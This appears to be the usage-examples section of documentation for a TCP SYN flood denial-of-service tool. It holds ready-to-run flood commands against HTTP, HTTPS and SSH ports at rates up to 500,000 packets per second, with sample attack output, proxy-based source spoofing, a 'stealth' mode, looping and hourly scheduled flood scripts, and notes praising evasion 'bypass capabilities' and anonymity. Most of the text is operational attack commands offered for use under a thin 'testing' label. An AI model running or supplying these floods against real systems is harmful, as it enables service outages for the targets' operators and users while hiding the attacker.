# Usage Examples

This document provides practical examples of using the TCP SYN flood tool.

## Basic Examples

### Example 1: Simple HTTP Port Test

Test a web server on port 80:

```bash
sudo ./syn 192.168.1.100 80 100 30 50000
```

**Breakdown:**
- Target: `192.168.1.100:80`
- Threads: 100
- Duration: 30 seconds
- Max PPS: 50,000

**Expected Output:**
```
[+] Starting 100 threads with PURE SYN FLOOD
[+] Target: 192.168.1.100:80
[+] Maximum PPS: 50000
[*] Attack: 100% SYN packets with random TCP options (MSS, Window Scale, Timestamp)
[*] Running for 30 seconds...

[LIVE] PPS: 48500 | Sent: 1455000 | Failed: 250 | Mbps: 3.88
```

### Example 2: High-Intensity Attack

Maximum intensity attack:

```bash
sudo ./syn 10.0.0.1 443 1000 300 500000
```

**Warning:** This uses 1000 threads and 500k PPS. Ensure your system can handle this load.

### Example 3: SSH Port Attack

Target SSH service:

```bash
sudo ./syn 192.168.1.50 22 200 60 100000
```

## SOCKS5 Proxy Examples

### Example 4: Using SOCKS5 Proxies

1. Create `socks5.txt`:
```
192.168.1.100:1080
192.168.1.101:1080:user:pass
proxy.example.com:1080
```

2. Run with proxy support:
```bash
sudo ./syn 192.168.1.200 80 500 120 200000 --socks5
```

**Output:**
```
[+] Loaded 3 SOCKS5 proxies from socks5.txt
[+] Starting 500 threads with PROXIED RAW SOCKET SYN FLOOD
[*] Mode: Proxied Raw Socket (proxy IP spoofing + random TCP options)
[*] Proxies: 3 loaded (used as spoofed source IPs)
```

### Example 5: Proxy with Authentication

If your proxies require authentication:

```
# socks5.txt
proxy1.com:1080:username1:password1
proxy2.com:1080:username2:password2
```

Run:
```bash
sudo ./syn 192.168.1.200 443 300 60 150000 --socks5
```

## Advanced Scenarios

### Example 6: Long-Duration Test

Run for extended period:

```bash
sudo ./syn 192.168.1.100 80 300 3600 100000
```

This runs for 1 hour (3600 seconds) with moderate intensity.

### Example 7: Low-Intensity Stealth Test

Minimal footprint test:

```bash
sudo ./syn 192.168.1.100 80 10 60 1000
```

Uses only 10 threads and 1k PPS for stealth testing.

### Example 8: Multi-Port Testing Script

Test multiple ports:

```bash
#!/bin/bash
TARGET="192.168.1.100"
PORTS=(80 443 22 25 53)

for port in "${PORTS[@]}"; do
    echo "Testing port $port..."
    sudo ./syn $TARGET $port 100 30 50000
    sleep 5
done
```

## Performance Tuning

### Example 9: CPU-Optimized

For systems with many CPU cores:

```bash
sudo ./syn 192.168.1.100 80 500 60 200000
```

### Example 10: Memory-Constrained System

For systems with limited RAM:

```bash
sudo ./syn 192.168.1.100 80 50 60 25000
```

Uses fewer threads to reduce memory usage.

## Monitoring and Analysis

### Example 11: Monitor with tcpdump

Capture packets during attack:

```bash
# Terminal 1: Run attack
sudo ./syn 192.168.1.100 80 200 60 100000

# Terminal 2: Capture packets
sudo tcpdump -i any -w syn_flood.pcap 'host 192.168.1.100'
```

### Example 12: Monitor System Resources

Watch system performance:

```bash
# Terminal 1: Run attack
sudo ./syn 192.168.1.100 80 300 60 100000

# Terminal 2: Monitor
watch -n 1 'netstat -s | grep -i syn'
```

## Troubleshooting Examples

### Example 13: Permission Issues

If you get "Permission denied":

```bash
# Check if running as root
whoami
# Should output: root

# If not, use sudo
sudo ./syn 192.168.1.100 80 100 30 50000
```

### Example 14: Low Performance

If PPS is lower than expected:

```bash
# Check file descriptor limit
ulimit -n

# Increase if needed
ulimit -n 1048576

# Then run attack
sudo ./syn 192.168.1.100 80 300 60 100000
```

### Example 15: Proxy Connection Issues

If proxies fail:

```bash
# Test proxy manually
curl --socks5 proxy_ip:port http://example.com

# Check proxy format in socks5.txt
cat socks5.txt
# Should be: ip:port or ip:port:user:pass

# Run with verbose output (if debug build)
sudo ./syn 192.168.1.100 80 100 30 50000 --socks5
```

## Scripts and Automation

### Example 16: Automated Test Script

```bash
#!/bin/bash
TARGET=$1
PORT=$2
DURATION=$3

if [ -z "$TARGET" ] || [ -z "$PORT" ] || [ -z "$DURATION" ]; then
    echo "Usage: $0 <target_ip> <port> <duration>"
    exit 1
fi

echo "Starting SYN flood test..."
echo "Target: $TARGET:$PORT"
echo "Duration: $DURATION seconds"

sudo ./syn $TARGET $PORT 300 $DURATION 100000

echo "Test completed."
```

Usage:
```bash
chmod +x test_syn.sh
./test_syn.sh 192.168.1.100 80 60
```

### Example 17: Scheduled Testing

```bash
#!/bin/bash
# Run test every hour
while true; do
    sudo ./syn 192.168.1.100 80 200 60 50000
    sleep 3600
done
```

## Best Practices

1. **Start Small**: Begin with low thread counts and PPS, then scale up
2. **Monitor Resources**: Watch CPU, memory, and network usage
3. **Test Locally First**: Test on localhost before targeting remote systems
4. **Use Appropriate Duration**: Don't run indefinitely
5. **Document Results**: Keep logs of test results for analysis

## Notes

- SYN packets are smaller (~40-80 bytes) than ACK packets, so bandwidth usage is lower
- Connection state tracking helps maintain realistic packet sequences
- Random TCP options improve bypass capabilities
- SOCKS5 proxy mode provides additional anonymity layer

